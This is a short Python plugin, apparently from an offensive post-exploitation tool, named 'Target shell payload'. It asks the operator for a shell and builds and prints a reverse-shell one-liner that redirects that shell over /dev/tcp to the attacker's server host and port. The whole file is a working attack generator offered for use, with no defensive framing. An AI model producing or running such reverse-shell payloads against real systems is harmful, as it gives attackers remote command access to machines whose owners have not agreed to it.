#!/usr/bin/env python3

import core.helper as h
class payload:
	def __init__(self):
		self.name = "Target shell payload"
		self.description = "Creates a shell payload."
		self.usage = "Run in terminal."

	def run(self,server):
		shell = input(h.info_general_raw("Target shell: ")).strip(" ")
		if shell == "":
			shell = "sh"
		h.info_general("Creating payload...")
		payload = shell+" &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"
		h.info_command(payload)
